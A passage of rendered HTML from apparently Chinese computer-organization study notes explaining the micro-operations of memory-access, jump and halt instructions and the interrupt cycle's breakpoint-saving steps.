style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr><tr><td>STP</td><td>停机指令</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>→</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">0\rightarrow G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span>是停机标志</td></tr></tbody></table><h5 id="访存指令"><a class="markdownIt-Anchor" href="#访存指令"></a> 访存指令</h5><p>访存指令需要访问主存，所以一般都会涉及到总线传输，此时控制线输出的信号根据操作类型输出可读可写。</p><ul><li><p>加法指令 ADD X</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(IR)\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将指令寄存器的形式地址送入MAR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">1\rightarrow R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>控制线输出读信号</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M(MAR)\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>主存读取MAR地址中的数据送回MDR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mi>C</mi><mi>C</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mi>M</mi><mi>D</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>A</mi><mi>C</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">(ACC)+(MDR)\rightarrow ACC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></p><p>ACC中的值加上MDR中的数据，计算结果保存在ACC中</p></li></ol></li><li><p>存数指令 STA X</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(IR)\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将形式地址送入MAR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">1\rightarrow W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></p><p>控制线输出写信号</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>C</mi><mi>C</mi><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">ACC\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将ACC内的值送入MDR内</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">MDR\rightarrow M(MAR)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></p><p>将MDR中的数据写入主存中MAR的地址内</p></li></ol></li><li><p>取数指令 LDA X</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(IR)\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>形式地址送入MAR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">1\rightarrow R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>控制线输出读信号</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M(MAR)\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将主存中MAR地址内的数据取出存放在MDR中</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>A</mi><mi>C</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">MDR\rightarrow ACC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></p><p>将MDR中的数据送入ACC，而不是与ACC内的值相加</p></li></ol></li></ul><h5 id="转移指令"><a class="markdownIt-Anchor" href="#转移指令"></a> 转移指令</h5><p>转移指令分为无条件转移和有条件转移，对应汇编中的<code>jmp</code>和<code>jz</code>等指令。要实现转移指令，一般涉及到对PC的修改。</p><ul><li><p>无条件转移 JMP X</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">Ad(IR)\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，直接将指令中的形式地址送入PC，因为<code>JMP</code>后跟着的操作数往往就是需要跳转执行的指令地址</p></li><li><p>条件转移 BAN X</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>0</mn></msub><mo separator="true">⋅</mo><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>+</mo><mover accent="true"><msub><mi>A</mi><mn>0</mn></msub><mo stretchy="true">‾</mo></mover><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><mo stretchy="false">)</mo><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">A_0·Ad(IR)+\overline{A_0}(PC)\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.13333em;vertical-align:-0.25em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，条件转移实际上是看ACC的首位<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">A_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是否为负数（对应高电平，因为符号位取1代表负数）。是负数则转移，否则不转移。</p></li></ul><h4 id="指令周期"><a class="markdownIt-Anchor" href="#指令周期"></a> 指令周期</h4><p>各类指令对应的指令周期总结如下图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621105317997.png" alt="image-20240621105317997" style="zoom:50%;" /><p>只要查看有无间接过程，就能判断有无间址周期。否则，大部分指令只需要取指周期和执行周期。判断指令经过的具体周期后，就能根据细分的周期分析执行指令时需要的微指令。</p><h4 id="中断周期"><a class="markdownIt-Anchor" href="#中断周期"></a> 中断周期</h4><p>除了取指、间址、执行外，还有一类特殊的周期是中断周期。中断往往是由外部I/O设备对CPU发出的请求产生的，所以他们有特殊的微指令操作。</p><p>我们在第八章介绍中断系统时已经讨论过，在中断周期内执行的三个步骤：</p><ol><li>保存程序断点</li><li>形成中断服务程序入口地址</li><li>关中断</li></ol><p>以上三个步骤务必牢记。接下来我们就这三个步骤讨论CU在此过程中的作用。</p><h5 id="保存断点"><a class="markdownIt-Anchor" href="#保存断点"></a> 保存断点</h5><p>保存断点我们介绍了两种方法：将断点地址存于特殊的主存空间内（0号地址），入栈保存。相应的，他们的微指令操作也各不相同。</p><ul><li><p>存入“0”地址</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">0\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将0号地址送入MAR中</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">1\rightarrow W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></p><p>控制线输出写信号</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>C</mi><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">PC\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将此时PC的内容，也即程序断点地址送入MDR中</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">MDR\rightarrow M(MAR)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></p><p>将MDR的数据送入主存的0号地址</p></li></ol></li><li><p>断点入栈</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>P</mi><mo>−</mo><mn>1</mn><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">SP-1\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将栈顶指针（栈指针寄存器）的值减一，把此处的地址送入MAR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">1\rightarrow W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></p><p>控制线发出写信号</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>C</mi><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">PC\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>程序断点地址送入MDR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">MDR\rightarrow M(MAR)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" 